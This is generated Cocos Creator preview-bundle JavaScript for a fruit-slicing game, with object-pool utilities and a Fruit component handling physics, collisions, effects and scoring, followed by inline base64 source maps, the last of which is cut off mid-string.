
                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/__qc_index__.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}
require('./assets/Scripts/Fruit');
require('./assets/Scripts/FruitGroup');
require('./assets/Scripts/FruitJuice');
require('./assets/Scripts/Game');
require('./assets/Scripts/JuiceGroup');
require('./assets/Scripts/Menu');
require('./assets/Scripts/ReturnMenu');
require('./assets/Scripts/utils');

                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/utils.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '76bdfhm93ZOOb8AnKuDLDR9', 'utils');
// Scripts/utils.js

"use strict";

module.exports = {
  GD: null,
  // req user obj
  //批量初始化对象池 
  batchInitObjPool: function batchInitObjPool(ptO, objArray) {
    for (var i = 0; i < objArray.length; i++) {
      var objInfo = objArray[i];
      this.initObjPool(ptO, objInfo);
    }
  },
  //初始化对象池
  initObjPool: function initObjPool(ptO, objInfo) {
    var name = objInfo.name,
      poolName = name + 'Pool';
    ptO[poolName] = new cc.NodePool();
    var initPoolCount = objInfo.initPoolCount;
    for (var i = 0; i < initPoolCount; ++i) {
      var nodeO = cc.instantiate(objInfo.prefab);
      ptO[poolName].put(nodeO);
    }
  },
  //生成节点
  genNewNode: function genNewNode(pool, prefab, nodeParent) {
    var newNode = null;
    //判断对象池中是否还有
    if (pool.size() > 0) {
      newNode = pool.get();
    } else {
      //没有就生成。
      newNode = cc.instantiate(prefab);
    }
    ;
    nodeParent.addChild(newNode);
    return newNode;
  },
  //放回对象池
  backObjPool: function backObjPool(ptO, poolName, nodeInfo) {
    ptO[poolName].put(nodeInfo);
  },
  //获取随机数
  random: function random(min, max) {
    return Math.random() * (max - min) + min;
  }
};

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcdXRpbHMuanMiXSwibmFtZXMiOlsibW9kdWxlIiwiZXhwb3J0cyIsIkdEIiwiYmF0Y2hJbml0T2JqUG9vbCIsInB0TyIsIm9iakFycmF5IiwiaSIsImxlbmd0aCIsIm9iakluZm8iLCJpbml0T2JqUG9vbCIsIm5hbWUiLCJwb29sTmFtZSIsImNjIiwiTm9kZVBvb2wiLCJpbml0UG9vbENvdW50Iiwibm9kZU8iLCJpbnN0YW50aWF0ZSIsInByZWZhYiIsInB1dCIsImdlbk5ld05vZGUiLCJwb29sIiwibm9kZVBhcmVudCIsIm5ld05vZGUiLCJzaXplIiwiZ2V0IiwiYWRkQ2hpbGQiLCJiYWNrT2JqUG9vbCIsIm5vZGVJbmZvIiwicmFuZG9tIiwibWluIiwibWF4IiwiTWF0aCJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQUEsTUFBTSxDQUFDQyxPQUFPLEdBQUc7RUFDYkMsRUFBRSxFQUFFLElBQUk7RUFBRTtFQUNWO0VBQ0FDLGdCQUFnQixXQUFBQSxpQkFBQ0MsR0FBRyxFQUFFQyxRQUFRLEVBQUU7SUFDNUIsS0FBSyxJQUFJQyxDQUFDLEdBQUcsQ0FBQyxFQUFFQSxDQUFDLEdBQUdELFFBQVEsQ0FBQ0UsTUFBTSxFQUFFRCxDQUFDLEVBQUUsRUFBRTtNQUN0QyxJQUFJRSxPQUFPLEdBQUdILFFBQVEsQ0FBQ0MsQ0FBQyxDQUFDO01BQ3pCLElBQUksQ0FBQ0csV0FBVyxDQUFDTCxHQUFHLEVBQUVJLE9BQU8sQ0FBQztJQUNsQztFQUNKLENBQUM7RUFDRDtFQUNBQyxXQUFXLFdBQUFBLFlBQUNMLEdBQUcsRUFBRUksT0FBTyxFQUFFO0lBQ3RCLElBQUlFLElBQUksR0FBR0YsT0FBTyxDQUFDRSxJQUFJO01BQ25CQyxRQUFRLEdBQUdELElBQUksR0FBRyxNQUFNO0lBQzVCTixHQUFHLENBQUNPLFFBQVEsQ0FBQyxHQUFHLElBQUlDLEVBQUUsQ0FBQ0MsUUFBUSxFQUFFO0lBQ2pDLElBQUlDLGFBQWEsR0FBR04sT0FBTyxDQUFDTSxhQUFhO0lBQ3pDLEtBQUssSUFBSVIsQ0FBQyxHQUFHLENBQUMsRUFBRUEsQ0FBQyxHQUFHUSxhQUFhLEVBQUUsRUFBRVIsQ0FBQyxFQUFFO01BQ3BDLElBQUlTLEtBQUssR0FBR0gsRUFBRSxDQUFDSSxXQUFXLENBQUNSLE9BQU8sQ0FBQ1MsTUFBTSxDQUFDO01BQzFDYixHQUFHLENBQUNPLFFBQVEsQ0FBQyxDQUFDTyxHQUFHLENBQUNILEtBQUssQ0FBQztJQUM1QjtFQUNKLENBQUM7RUFDRDtFQUNBSSxVQUFVLFdBQUFBLFdBQUNDLElBQUksRUFBRUgsTUFBTSxFQUFFSSxVQUFVLEVBQUU7SUFDakMsSUFBSUMsT0FBTyxHQUFHLElBQUk7SUFDbEI7SUFDQSxJQUFJRixJQUFJLENBQUNHLElBQUksRUFBRSxHQUFHLENBQUMsRUFBRTtNQUNqQkQsT0FBTyxHQUFHRixJQUFJLENBQUNJLEdBQUcsRUFBRTtJQUN4QixDQUFDLE1BQ0k7TUFDRDtNQUNBRixPQUFPLEdBQUdWLEVBQUUsQ0FBQ0ksV0FBVyxDQUFDQyxNQUFNLENBQUM7SUFDcEM7SUFBQztJQUNESSxVQUFVLENBQUNJLFFBQVEsQ0FBQ0gsT0FBTyxDQUFDO0lBQzVCLE9BQU9BLE9BQU87RUFDbEIsQ0FBQztFQUNEO0VBQ0FJLFdBQVcsV0FBQUEsWUFBQ3RCLEdBQUcsRUFBRU8sUUFBUSxFQUFFZ0IsUUFBUSxFQUFFO0lBQ2pDdkIsR0FBRyxDQUFDTyxRQUFRLENBQUMsQ0FBQ08sR0FBRyxDQUFDUyxRQUFRLENBQUM7RUFDL0IsQ0FBQztFQUNEO0VBQ0FDLE1BQU0sV0FBQUEsT0FBQ0MsR0FBRyxFQUFFQyxHQUFHLEVBQUU7SUFDYixPQUFPQyxJQUFJLENBQUNILE1BQU0sRUFBRSxJQUFJRSxHQUFHLEdBQUdELEdBQUcsQ0FBQyxHQUFHQSxHQUFHO0VBQzVDO0FBQ0osQ0FBQyIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsibW9kdWxlLmV4cG9ydHMgPSB7XG4gICAgR0Q6IG51bGwsIC8vIHJlcSB1c2VyIG9ialxuICAgIC8v5om56YeP5Yid5aeL5YyW5a+56LGh5rGgIFxuICAgIGJhdGNoSW5pdE9ialBvb2wocHRPLCBvYmpBcnJheSkge1xuICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IG9iakFycmF5Lmxlbmd0aDsgaSsrKSB7XG4gICAgICAgICAgICBsZXQgb2JqSW5mbyA9IG9iakFycmF5W2ldO1xuICAgICAgICAgICAgdGhpcy5pbml0T2JqUG9vbChwdE8sIG9iakluZm8pO1xuICAgICAgICB9XG4gICAgfSxcbiAgICAvL+WIneWni+WMluWvueixoeaxoFxuICAgIGluaXRPYmpQb29sKHB0Tywgb2JqSW5mbykge1xuICAgICAgICBsZXQgbmFtZSA9IG9iakluZm8ubmFtZSxcbiAgICAgICAgICAgIHBvb2xOYW1lID0gbmFtZSArICdQb29sJztcbiAgICAgICAgcHRPW3Bvb2xOYW1lXSA9IG5ldyBjYy5Ob2RlUG9vbCgpO1xuICAgICAgICBsZXQgaW5pdFBvb2xDb3VudCA9IG9iakluZm8uaW5pdFBvb2xDb3VudDtcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBpbml0UG9vbENvdW50OyArK2kpIHtcbiAgICAgICAgICAgIGxldCBub2RlTyA9IGNjLmluc3RhbnRpYXRlKG9iakluZm8ucHJlZmFiKTtcbiAgICAgICAgICAgIHB0T1twb29sTmFtZV0ucHV0KG5vZGVPKTtcbiAgICAgICAgfVxuICAgIH0sXG4gICAgLy/nlJ/miJDoioLngrlcbiAgICBnZW5OZXdOb2RlKHBvb2wsIHByZWZhYiwgbm9kZVBhcmVudCkge1xuICAgICAgICBsZXQgbmV3Tm9kZSA9IG51bGw7XG4gICAgICAgIC8v5Yik5pat5a+56LGh5rGg5Lit5piv5ZCm6L+Y5pyJXG4gICAgICAgIGlmIChwb29sLnNpemUoKSA+IDApIHtcbiAgICAgICAgICAgIG5ld05vZGUgPSBwb29sLmdldCgpO1xuICAgICAgICB9IFxuICAgICAgICBlbHNlIHtcbiAgICAgICAgICAgIC8v5rKh5pyJ5bCx55Sf5oiQ44CCXG4gICAgICAgICAgICBuZXdOb2RlID0gY2MuaW5zdGFudGlhdGUocHJlZmFiKTtcbiAgICAgICAgfTtcbiAgICAgICAgbm9kZVBhcmVudC5hZGRDaGlsZChuZXdOb2RlKTtcbiAgICAgICAgcmV0dXJuIG5ld05vZGU7XG4gICAgfSxcbiAgICAvL+aUvuWbnuWvueixoeaxoFxuICAgIGJhY2tPYmpQb29sKHB0TywgcG9vbE5hbWUsIG5vZGVJbmZvKSB7XG4gICAgICAgIHB0T1twb29sTmFtZV0ucHV0KG5vZGVJbmZvKTtcbiAgICB9LFxuICAgIC8v6I635Y+W6ZqP5py65pWwXG4gICAgcmFuZG9tKG1pbiwgbWF4KSB7XG4gICAgICAgIHJldHVybiBNYXRoLnJhbmRvbSgpICogKG1heCAtIG1pbikgKyBtaW47XG4gICAgfVxufTsiXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/Scripts/Fruit.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'b27f0f8tplBLJU9TzXaiOUK', 'Fruit');
// Scripts/Fruit.js

"use strict";

var utils = require('utils');
cc.Class({
  "extends": cc.Component,
  properties: {
    //完整水果块。
    comFruit: cc.Node,
    //被切割的水果。
    splitAni: cc.Node,
    //类型
    type: 'fruit',
    forceHorzMin: 0,
    forceHorzMax: 1000,
    forceMin: 30000,
    forceMax: 35000,
    colorType: 1,
    //音效
    cutFruitAudio: cc.AudioClip,
    cutBombAudio: cc.AudioClip
  },
  onLoad: function onLoad() {
    this.poolName = '';
    //获取游戏脚本组件,使用其上的函数。
    this.gameObj = cc.find('/Canvas/gameContainer').getComponent("Game");
    this.parent = this.node.parent.getComponent('FruitGroup');
    this.fruitJuiceGroup = cc.find('/Canvas/gameContainer/fruitJuice').getComponent("JuiceGroup");
    //如果是水果，就获取其上的动画组件。
    if (this.type == 'fruit') {
      this.ani = this.splitAni.getComponent('cc.Animation');
    }
  },
  init: function init(poolName, score) {
    this.poolName = poolName;
    this.score = score;
    this.isCut = false;
    //判断是否是水果类，更改其激活状态。
    if (this.type == 'fruit') {
      this.comFruit.active = true;
      this.splitAni.active = false;
      this.recoveryAniFirstFps();
    }
    ;
    var fruitNodeRigidBody = this.node.getComponent(cc.RigidBody);
    var forceY = Math.floor(utils.random(this.forceMin, this.forceMax)),
      forceX = Math.floor(utils.random(this.forceHorzMin, this.forceHorzMax));
    fruitNodeRigidBody.angularVelocity = utils.random(-1, 1) > 0 ? 100 : -100; //角速度 默认100
    fruitNodeRigidBody.applyForceToCenter(cc.v2(this.node.x > 0 ? -forceX : forceX, forceY), true);
  },
  onCollisionEnter: function onCollisionEnter(other, self) {
    //检测是否与knife发生碰撞。
    if (other.tag == 50) {
      if (!this.isCut) {
        if (this.type == 'fruit') {
          //创建果汁特效。
          this.fruitJuiceGroup.createJuiceBg(this.node.getPosition(), this.colorType);
          //播放动画特效。
          this.playSplitAni();
          //播放切水果音效
          cc.audioEngine.play(this.cutFruitAudio, false, 1);
          this.gameObj.updateScore(1, this.score);
        } else {
          // 炸弹
          this.parent.cutBombRemoveAllChildren();
          //播放切炸弹音效
          cc.audioEngine.play(this.cutBombAudio, false, 1);
        }
      }
      ;
      this.isCut = true;
    }
    ;
    //判断是否和地板发生碰撞。
    if (other.tag == 100) {
      this.backThisNode();
      this.parent.checkRemain();
    }
    ;
  },
  playSplitAni: function playSplitAni() {
    this.comFruit.active = false;
    this.splitAni.active = true;
    this.ani.play();
  },
  recoveryAniFirstFps: function recoveryAniFirstFps() {
    //恢复动画的初始帧位置
    var aniName = this.ani.getClips()[0].name;
    var state = this.ani.getAnimationState(aniName);
    var curves = state.curves;
    var info = state.getWrappedInfo(0.01);
    for (var i = 0, len = curves.length; i < len; i++) {
      var curve = curves[i];
      curve.sample(info.time, info.ratio, this);
    }
  },
  backThisNode: function backThisNode(isBombBack) {
    if (!isBombBack && this.type == 'fruit' && !this.isCut) {
      this.gameObj.updateScore(0, this.score);
    }
    ;
    //放回对象池。
    utils.backObjPool(this.parent, this.poolName, this.node);
  }
});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcRnJ1aXQuanMiXSwibmFtZXMiOlsidXRpbHMiLCJyZXF1aXJlIiwiY2MiLCJDbGFzcyIsIkNvbXBvbmVudCIsInByb3BlcnRpZXMiLCJjb21GcnVpdCIsIk5vZGUiLCJzcGxpdEFuaSIsInR5cGUiLCJmb3JjZUhvcnpNaW4iLCJmb3JjZUhvcnpNYXgiLCJmb3JjZU1pbiIsImZvcmNlTWF4IiwiY29sb3JUeXBlIiwiY3V0RnJ1aXRBdWRpbyIsIkF1ZGlvQ2xpcCIsImN1dEJvbWJBdWRpbyIsIm9uTG9hZCIsInBvb2xOYW1lIiwiZ2FtZU9iaiIsImZpbmQiLCJnZXRDb21wb25lbnQiLCJwYXJlbnQiLCJub2RlIiwiZnJ1aXRKdWljZUdyb3VwIiwiYW5pIiwiaW5pdCIsInNjb3JlIiwiaXNDdXQiLCJhY3RpdmUiLCJyZWNvdmVyeUFuaUZpcnN0RnBzIiwiZnJ1aXROb2RlUmlnaWRCb2R5IiwiUmlnaWRCb2R5IiwiZm9yY2VZIiwiTWF0aCIsImZsb29yIiwicmFuZG9tIiwiZm9yY2VYIiwiYW5ndWxhclZlbG9jaXR5IiwiYXBwbHlGb3JjZVRvQ2VudGVyIiwidjIiLCJ4Iiwib25Db2xsaXNpb25FbnRlciIsIm90aGVyIiwic2VsZiIsInRhZyIsImNyZWF0ZUp1aWNlQmciLCJnZXRQb3NpdGlvbiIsInBsYXlTcGxpdEFuaSIsImF1ZGlvRW5naW5lIiwicGxheSIsInVwZGF0ZVNjb3JlIiwiY3V0Qm9tYlJlbW92ZUFsbENoaWxkcmVuIiwiYmFja1RoaXNOb2RlIiwiY2hlY2tSZW1haW4iLCJhbmlOYW1lIiwiZ2V0Q2xpcHMiLCJuYW1lIiwic3RhdGUiLCJnZXRBbmltYXRpb25TdGF0ZSIsImN1cnZlcyIsImluZm8iLCJnZXRXcmFwcGVkSW5mbyIsImkiLCJsZW4iLCJsZW5ndGgiLCJjdXJ2ZSIsInNhbXBsZSIsInRpbWUiLCJyYXRpbyIsImlzQm9tYkJhY2siLCJiYWNrT2JqUG9vbCJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7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SixDQUFDLENBQUMiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbImNvbnN0IHV0aWxzID0gcmVxdWlyZSgndXRpbHMnKTtcbmNjLkNsYXNzKHtcbiAgICBleHRlbmRzIDogY2MuQ29tcG9uZW50LFxuICAgIHByb3BlcnRpZXMgOiB7XG4gICAgICAgIC8v5a6M5pW05rC05p6c5Z2X44CCXG4gICAgICAgIGNvbUZydWl0IDogY2MuTm9kZSxcbiAgICAgICAgLy/ooqvliIflibLnmoTmsLTmnpzjgIJcbiAgICAgICAgc3BsaXRBbmkgOiAgY2MuTm9kZSxcbiAgICAgICAgLy/nsbvlnotcbiAgICAgICAgdHlwZSA6ICdmcnVpdCcsXG4gICAgICAgIGZvcmNlSG9yek1pbiA6IDAsXG4gICAgICAgIGZvcmNlSG9yek1heCA6IDEwMDAsXG4gICAgICAgIGZvcmNlTWluIDogMzAwMDAsXG4gICAgICAgIGZvcmNlTWF4IDogMzUwMDAsXG4gICAgICAgIGNvbG9yVHlwZSA6IDEsXG4gICAgICAgIC8v6Z+z5pWIXG4gICAgICAgIGN1dEZydWl0QXVkaW8gOiBjYy5BdWRpb0NsaXAsXG4gICAgICAgIGN1dEJvbWJBdWRpbyA6IGNjLkF1ZGlvQ2xpcCwgXG4gICAgfSxcbiAgICBvbkxvYWQoKSB7XG4gICAgICAgIHRoaXMucG9vbE5hbWUgPSAnJztcbiAgICAgICAgLy/ojrflj5bmuLjmiI/ohJrmnKznu4Tku7Ys5L2/55So5YW25LiK55qE5Ye95pWw44CCXG4gICAgICAgIHRoaXMuZ2FtZU9iaiA9IGNjLmZpbmQoJy9DYW52YXMvZ2FtZUNvbnRhaW5lcicpLmdldENvbXBvbmVudChcIkdhbWVcIik7XG4gICAgICAgIHRoaXMucGFyZW50ID0gdGhpcy5ub2RlLnBhcmVudC5nZXRDb21wb25lbnQoJ0ZydWl0R3JvdXAnKTtcbiAgICAgICAgdGhpcy5mcnVpdEp1aWNlR3JvdXAgPSBjYy5maW5kKCcvQ2FudmFzL2dhbWVDb250YWluZXIvZnJ1aXRKdWljZScpLmdldENvbXBvbmVudChcIkp1aWNlR3JvdXBcIik7XG4gICAgICAgIC8v5aaC5p6c5piv5rC05p6c77yM5bCx6I635Y+W5YW25LiK55qE5Yqo55S757uE5Lu244CCXG4gICAgICAgIGlmICh0aGlzLnR5cGUgPT0gJ2ZydWl0JykgeyBcbiAgICAgICAgICAgIHRoaXMuYW5pID0gdGhpcy5zcGxpdEFuaS5nZXRDb21wb25lbnQoJ2NjLkFuaW1hdGlvbicpO1xuICAgICAgICB9XG4gICAgfSxcbiAgICBpbml0KHBvb2xOYW1lLCBzY29yZSkge1xuICAgICAgICB0aGlzLnBvb2xOYW1lID0gcG9vbE5hbWU7XG4gICAgICAgIHRoaXMuc2NvcmUgPSBzY29yZTtcbiAgICAgICAgdGhpcy5pc0N1dCA9IGZhbHNlO1xuICAgICAgICAvL+WIpOaWreaYr+WQpuaYr+awtOaenOexu++8jOabtOaUueWFtua/gOa0u+eKtuaAgeOAglxuICAgICAgICBpZiAodGhpcy50eXBlID09ICdmcnVpdCcpIHtcbiAgICAgICAgICAgIHRoaXMuY29tRnJ1aXQuYWN0aXZlID0gdHJ1ZTtcbiAgICAgICAgICAgIHRoaXMuc3BsaXRBbmkuYWN0aXZlID0gZmFsc2U7XG4gICAgICAgICAgICB0aGlzLnJlY292ZXJ5QW5pRmlyc3RGcHMoKTtcbiAgICAgICAgfTtcbiAgICAgICAgbGV0IGZydWl0Tm9kZVJpZ2lkQm9keSA9IHRoaXMubm9kZS5nZXRDb21wb25lbnQoY2MuUmlnaWRCb2R5KTtcbiAgICAgICAgbGV